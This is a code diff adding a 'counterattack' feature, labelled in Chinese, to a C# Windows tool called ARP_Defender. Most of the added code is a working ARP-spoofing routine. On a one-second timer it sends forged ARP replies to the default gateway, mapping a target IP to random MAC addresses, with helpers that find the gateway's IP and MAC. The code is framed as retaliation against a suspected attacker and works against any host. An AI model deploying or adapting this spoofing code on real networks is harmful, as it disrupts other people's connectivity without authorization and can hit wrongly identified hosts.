@@ -188,5 +188,165 @@ namespace ARP_Defender
 
             return dirResults;
          }
+
+        Timer myTimer = new Timer();
+        int Count = 0;
+        private void start_attackbutton_Click(object sender, EventArgs e)
+        {
+            stop_attackbutton.Enabled = true;
+            start_attackbutton.Enabled = false;
+
+            myTimer.Tick += new EventHandler(SendPacket);
+            myTimer.Enabled = true;
+            myTimer.Interval = 1000; //豪秒為單位，1秒執行1次
+            show_label.Text = "開啟反擊！";
+        }
+
+        private void stop_attackbutton_Click(object sender, EventArgs e)
+        {
+            stop_attackbutton.Enabled = false;
+            start_attackbutton.Enabled = true;
+            myTimer.Stop();
+            show_label.Text = "取消反擊！";
+        }
+
+        public void SendPacket(object sender, EventArgs e)
+        {
+            var devices = LibPcapLiveDeviceList.Instance;
+            int i = 0;
+            foreach (var dev in devices)
+            {
+                if (dev.Interface.FriendlyName == GetNetworkAdapterName())
+                {
+                    break;
+                }
+                else
+                {
+                    i++;
+                }
+            }
+
+            //test_label.Text = devices[i].Interface.FriendlyName;
+            var device = devices[i];
+            device.Open();
+            EthernetPacket eth = Send_ARPResponse_Packet();
+            device.SendPacket(eth);
+            Count++;
+        }
+
+        public EthernetPacket Send_ARPResponse_Packet()
+        {
+            string strEthDestMAC = GetGatewayMACAddress(GetGatewayIPAddress().ToString());
+            string strEhSourMac = GetHostMACAddress();
+
+            string strARPSourIP = attack_ip;
+            string strARPSourMac = GetRandomWifiMacAddress();
+
+            string strARPDestIP = GetGatewayIPAddress().ToString();
+            string strARPDestMac = GetGatewayMACAddress(GetGatewayIPAddress().ToString());
+
+            ArpPacket arp = new ArpPacket(ArpOperation.Response, PhysicalAddress.Parse(strARPDestMac), IPAddress.Parse(strARPDestIP), PhysicalAddress.Parse(strARPSourMac), IPAddress.Parse(strARPSourIP));
+            EthernetPacket eth = new EthernetPacket(PhysicalAddress.Parse(strEhSourMac), PhysicalAddress.Parse(strEthDestMAC), EthernetType.Arp);
+            eth.PayloadPacket = arp;
+            return eth;
+        }
+
+        public static IPAddress GetGatewayIPAddress()
+        {
+            //透過ping Google DNS 達到traceroute效果，獲得主機預設閘道
+            IPAddress netaddr = IPAddress.Parse("8.8.8.8");
+
+            PingReply reply = default;
+            var ping = new Ping();
+            var options = new PingOptions(1, true); // ttl=1, dont fragment=true
+            try
+            {
+                //200毫秒就 timeout
+                reply = ping.Send(netaddr, 200, new byte[0], options);
+            }
+            catch (PingException)
+            {
+                MessageBox.Show("找不到預設閘道 IP 位址，可能設備沒有連上網際網路，請確認後再開啟本程式。", "錯誤");
+                return default;
+            }
+            if (reply.Status != IPStatus.TtlExpired)
+            {
+                MessageBox.Show("找不到預設閘道 IP 位址，可能設備沒有連上網際網路，請確認後再開啟本程式。", "錯誤");
+                return default;
+            }
+            return reply.Address;
+        }
+
+        public string GetGatewayMACAddress(string GatewayIP)
+        {
+            //呼叫 cmd 執行 arp -a 指令，透過IP找到ARP Table中MAC對應關係
+            string dirResults = string.Empty;
+            ProcessStartInfo psi = new ProcessStartInfo();
+            Process proc = new Process();
+            psi.FileName = "arp";
+            psi.RedirectStandardInput = false;
+            psi.RedirectStandardOutput = true;
+            psi.Arguments = "-a " + GatewayIP;
+            psi.UseShellExecute = false;
+            psi.CreateNoWindow = true;
+            try
+            {
+                proc = Process.Start(psi);
+                dirResults = proc.StandardOutput.ReadToEnd();
+                proc.WaitForExit();
+            }
+            catch (Exception)
+            { }
+
+            Match m = Regex.Match(dirResults, "\\w+\\-\\w+\\-\\w+\\-\\w+\\-\\w+\\-\\w\\w");
+
+            if (m.ToString() != "")
+            {
+                return MACAddress_Upper(m.ToString());
+            }
+            else
+            {
+                MessageBox.Show("找不到預設閘道 MAC 位址，ARP紀錄表查無該筆紀錄，請確認後再開啟本程式。", "錯誤");
+                return "找不到預設閘道 MAC 位址";
+            }
+        }
+
+        public static string GetRandomWifiMacAddress()
+        {
+            var random = new Random();
+            var buffer = new byte[6];
+            random.NextBytes(buffer);
+            buffer[0] = 02;
+            var result = string.Concat(buffer.Select(x => string.Format("{0}", x.ToString("X2"))).ToArray());
+            return result;
+        }
+
+        public string MACAddress_Upper(string MACAddress)
+        {
+            //將MAC位址十六位元英文小寫轉大寫
+            string English = "ABCDEF";
+            string english = "abcdef";
+
+            string a = MACAddress;
+            string b = string.Empty;
+            for (int i = 0; i < a.Length; i++)
+            {
+                if (a[i] >= 'a' && a[i] <= 'f')
+                {
+                    for (int j = 0; j < 6; j++)
+                    {
+                        if (a[i] == english[j])
+                        {
+                            b += English[j];
+                        }
+                    }
+                }
+                else
+                {
+                    b += a[i];
+                }
+            }
+            return b;
+        }
     }
 }
